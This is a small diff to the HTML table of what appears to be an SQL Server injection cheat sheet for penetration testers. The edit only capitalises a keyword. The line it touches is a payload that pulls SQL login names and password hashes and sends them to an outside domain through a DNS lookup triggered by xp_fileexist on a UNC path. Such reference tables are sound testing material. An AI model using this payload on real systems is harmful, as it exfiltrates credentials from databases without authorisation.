@@ -13,7 +13,7 @@
     <tbody>
         <tr>
             <td>Make DNS Request</td>
-            <td>declare @host varchar(800);<br>select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + 'netspi.com' from sys.sql_logins;<br>exec('xp_fileexist "\' + @host + 'c$boot.ini"');</td>
+            <td>DECLARE @host varchar(800);<br>select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + 'netspi.com' from sys.sql_logins;<br>exec('xp_fileexist "\' + @host + 'c$boot.ini"');</td>
         </tr>
         <tr>
           <td>UNC Path (DNS Request)</td>
